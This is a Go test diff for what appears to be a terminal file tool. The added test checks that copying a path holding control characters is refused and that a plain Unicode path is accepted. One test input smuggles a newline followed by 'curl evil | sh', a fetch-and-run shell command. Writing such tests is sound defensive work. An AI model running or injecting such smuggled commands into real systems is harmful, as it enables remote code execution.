@@ -480,3 +480,20 @@ func TestColourDepthsRenderSameGeometry(t *testing.T) {
 		checkFrame(t, m, 100, 30)
 	}
 }
+
+// A filename with a newline would run commands when pasted into a shell.
+func TestCopyRefusesControlCharacters(t *testing.T) {
+	m := newTestModel(t)
+	m.copyPath("/srv/x\ncurl evil | sh\n")
+	if !strings.HasPrefix(m.toast, "Not copied") {
+		t.Fatalf("hostile path copied: %q", m.toast)
+	}
+	m.copyPath("/srv/media/" + hostile)
+	if !strings.HasPrefix(m.toast, "Not copied") {
+		t.Fatalf("escape sequence copied: %q", m.toast)
+	}
+	m.copyPath("/srv/photos 日本語/img001.jpg")
+	if !strings.HasPrefix(m.toast, "Copied") {
+		t.Fatalf("plain path refused: %q", m.toast)
+	}
+}
